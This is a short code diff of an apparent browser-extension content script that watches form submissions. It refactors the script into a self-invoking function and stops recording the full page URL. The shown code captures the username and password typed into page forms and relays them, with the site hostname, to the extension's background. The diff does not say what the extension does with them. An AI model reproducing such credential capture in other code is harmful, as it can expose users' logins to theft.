@@ -1,4 +1,6 @@
-function monitorSubmissions() {
+'use strict';
+
+(function () {
   
     var forms = document.getElementsByTagName('form');
 
@@ -28,7 +30,7 @@ function monitorSubmissions() {
                   chrome.extension.sendRequest({
                       action: 'send',
                       record: [
-                          window.location.href,
+                          //window.location.href,
                           window.location.hostname,
                           this._user.value,
                           this._pass.value
@@ -39,6 +41,4 @@ function monitorSubmissions() {
         break;
     }
   }
-}
-
-monitorSubmissions();
+})();
